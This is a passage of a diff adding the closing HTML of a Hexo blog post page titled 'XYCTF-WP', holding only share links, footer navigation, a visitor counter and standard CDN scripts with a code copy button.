+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&text=XYCTF-WP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&title=XYCTF-WP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&is_video=false&description=XYCTF-WP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XYCTF-WP&body=Check out this article: https://hexo.sheep-sys-sudo.top/XYCTF-WP/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&title=XYCTF-WP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&title=XYCTF-WP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&title=XYCTF-WP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&title=XYCTF-WP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&name=XYCTF-WP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/XYCTF-WP/&t=XYCTF-WP"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
